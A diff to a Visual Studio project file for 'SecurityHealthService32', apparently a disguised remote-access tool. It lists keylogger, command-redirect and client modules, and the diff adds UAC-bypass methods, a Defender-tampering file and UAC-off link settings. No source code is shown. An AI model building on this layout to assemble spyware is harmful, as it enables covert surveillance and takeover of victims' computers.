@@ -24,7 +24,7 @@
     <ProjectName>SecurityHealthService32</ProjectName>
     <VcpkgTriplet Condition="'$(Platform)'=='x64'">x64-windows-static</VcpkgTriplet>
     <VcpkgTriplet Condition="'$(Platform)'=='Win32'">x86-windows-static</VcpkgTriplet>
-    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <WindowsTargetPlatformVersion>10.0.22000.0</WindowsTargetPlatformVersion>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
@@ -112,6 +112,7 @@
     </ClCompile>
     <Link>
       <AdditionalLibraryDirectories>$(SolutionDir);$(SolutionDir)Shared;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <EnableUAC>false</EnableUAC>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
@@ -149,37 +150,92 @@
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>false</GenerateDebugInformation>
       <AdditionalLibraryDirectories>$(SolutionDir);$(SolutionDir)Shared;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <UACExecutionLevel>AsInvoker</UACExecutionLevel>
+      <EnableUAC>false</EnableUAC>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="..\Shared\utility.cpp" />
+    <ClCompile Include="bypass.c" />
     <ClCompile Include="client.cpp" />
     <ClCompile Include="cmdRedirect.cpp" />
+    <ClCompile Include="compress.c" />
     <ClCompile Include="conversion.cpp" />
     <ClCompile Include="encryption.cpp" />
     <ClCompile Include="general.cpp" />
     <ClCompile Include="keylogger.cpp" />
     <ClCompile Include="main.cpp" />
+    <ClCompile Include="methods\api0cradle.c" />
+    <ClCompile Include="methods\comsup.c" />
     <ClCompile Include="Packet.cpp" />
     <ClCompile Include="PacketManager.cpp" />
     <ClCompile Include="SendGetMethods.cpp" />
     <ClCompile Include="serviceutils.cpp" />
     <ClCompile Include="settings.cpp" />
+    <ClCompile Include="Shared\cmdline.c" />
+    <ClCompile Include="Shared\hde\hde64.c" />
+    <ClCompile Include="Shared\ldr.c" />
+    <ClCompile Include="Shared\strtoi.c" />
+    <ClCompile Include="Shared\strtoul.c" />
+    <ClCompile Include="Shared\u64tohex.c" />
+    <ClCompile Include="Shared\u64tostr.c" />
+    <ClCompile Include="Shared\ultohex.c" />
+    <ClCompile Include="Shared\ultostr.c" />
+    <ClCompile Include="Shared\util.c" />
+    <ClCompile Include="Shared\windefend.c" />
+    <ClCompile Include="Shared\_filename.c" />
+    <ClCompile Include="Shared\_strcat.c" />
+    <ClCompile Include="Shared\_strcmp.c" />
+    <ClCompile Include="Shared\_strcmpi.c" />
+    <ClCompile Include="Shared\_strcpy.c" />
+    <ClCompile Include="Shared\_strend.c" />
+    <ClCompile Include="Shared\_strlen.c" />
+    <ClCompile Include="Shared\_strncmp.c" />
+    <ClCompile Include="Shared\_strncmpi.c" />
+    <ClCompile Include="Shared\_strncpy.c" />
+    <ClCompile Include="Shared\_strstri.c" />
+    <ClCompile Include="shortcut.cpp" />
+    <ClCompile Include="sup.c" />
     <ClCompile Include="utils.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="bypass.h" />
     <ClInclude Include="client.h" />
     <ClInclude Include="cmdRedirect.h" />
+    <ClInclude Include="compress.h" />
     <ClInclude Include="conversion.h" />
     <ClInclude Include="encryption.h" />
     <ClInclude Include="FileTransferData.h" />
     <ClInclude Include="general.h" />
+    <ClInclude Include="global_uac.h" />
     <ClInclude Include="keylogger.h" />
+    <ClInclude Include="methods\api0cradle.h" />
+    <ClInclude Include="methods\comsup.h" />
+    <ClInclude Include="methods\elvint.h" />
+    <ClInclude Include="methods\methods.h" />
     <ClInclude Include="Packet.h" />
     <ClInclude Include="PacketManager.h" />
     <ClInclude Include="PacketType.h" />
     <ClInclude Include="serviceutils.h" />
     <ClInclude Include="settings.h" />
+    <ClInclude Include="Shared\cmdline.h" />
+    <ClInclude Include="Shared\consts.h" />
+    <ClInclude Include="Shared\hde\hde64.h" />
+    <ClInclude Include="Shared\hde\pstdint.h" />
+    <ClInclude Include="Shared\hde\table64.h" />
+    <ClInclude Include="Shared\ldr.h" />
+    <ClInclude Include="Shared\libinc.h" />
+    <ClInclude Include="Shared\minirtl.h" />
+    <ClInclude Include="Shared\ntos\ntbuilds.h" />
+    <ClInclude Include="Shared\ntos\ntos.h" />
+    <ClInclude Include="Shared\ntos\ntsxs.h" />
+    <ClInclude Include="Shared\rtltypes.h" />
+    <ClInclude Include="Shared\shared.h" />
+    <ClInclude Include="Shared\util.h" />
+    <ClInclude Include="Shared\windefend.h" />
+    <ClInclude Include="Shared\_filename.h" />
+    <ClInclude Include="shortcut.h" />
+    <ClInclude Include="sup.h" />
     <ClInclude Include="utils.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
